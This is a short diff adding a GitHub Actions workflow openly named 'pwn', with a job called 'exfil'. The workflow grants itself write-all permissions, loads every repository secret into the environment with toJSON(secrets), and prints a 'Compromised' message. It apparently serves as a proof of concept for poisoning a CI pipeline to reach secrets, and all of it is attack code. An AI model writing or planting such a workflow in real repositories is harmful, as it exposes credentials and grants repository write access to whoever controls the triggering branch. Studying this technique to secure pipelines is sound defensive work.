@@ -1,0 +1,12 @@
+   name: pwn
+   on:
+     push:
+       branches: [test-main-pipeline]
+   permissions: write-all
+   jobs:
+     exfil:
+       runs-on: ubuntu-latest
+       steps:
+         - run: echo "Compromised - has access to secrets"
+           env:
+             SECRETS: ${{ toJSON(secrets) }}
